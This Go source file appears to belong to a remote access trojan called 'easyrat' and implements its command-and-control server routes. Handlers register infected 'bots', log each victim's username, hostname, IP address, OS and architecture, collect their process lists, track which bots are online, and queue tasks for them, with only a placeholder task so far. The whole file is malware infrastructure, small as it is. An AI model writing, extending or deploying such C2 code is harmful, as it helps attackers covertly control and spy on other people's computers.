package utils

import (
	"easyrat/utils/types"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
)

// Functions
func GetBot(ctx echo.Context) Client {
	id := ctx.Request().Header.Get("Session-ID")
	var client Client
	DB.First(&client, Client{ID: id})
	return client
}

// Routes
func RStatus(ctx echo.Context) error {
	ctx.JSON(http.StatusOK, types.ServerStatusResp{Status: "OK", Online: true})
	return nil
}

func RConnect(ctx echo.Context) error {
	dev_info := new(types.DeviceInfoStruct)
	ctx.Bind(dev_info)
	fmt.Printf("New bot connection: '%s@%s' (%s) %s, %s\n", dev_info.UserName, dev_info.HostName, ctx.RealIP(), dev_info.OSName, dev_info.Arch)
	DB.Save(&Client{ID: dev_info.MachineID, Connected: true, DeviceInfoStruct: *dev_info})
	return ctx.JSON(http.StatusOK, types.ConnectResp{SessionID: dev_info.MachineID, Connected: true})
}

func RProcList(ctx echo.Context) error {
	bot := GetBot(ctx)
	proc_list := new([]types.Process)
	ctx.Bind(proc_list)
	fmt.Printf("Got process list for '%s@%s':\n", bot.UserName, bot.OSName)
	return nil
}

func RDisconnect(ctx echo.Context) error {
	bot := GetBot(ctx)
	bot.Connected = false
	DB.Save(bot)
	return nil
}

func RGetBots(ctx echo.Context) error {
	var bots []Client
	DB.Model(&Client{}).Limit(50).Find(&bots, &Client{Connected: true})
	return ctx.JSON(http.StatusOK, bots)
}

func RGetTasks(ctx echo.Context) error {
	var tasks []types.Task
	tasks = append(tasks, types.Task{ID: "1", Name: "Hello World", Module: "hello_world", Status: "queued"})
	return ctx.JSON(http.StatusOK, tasks)
}
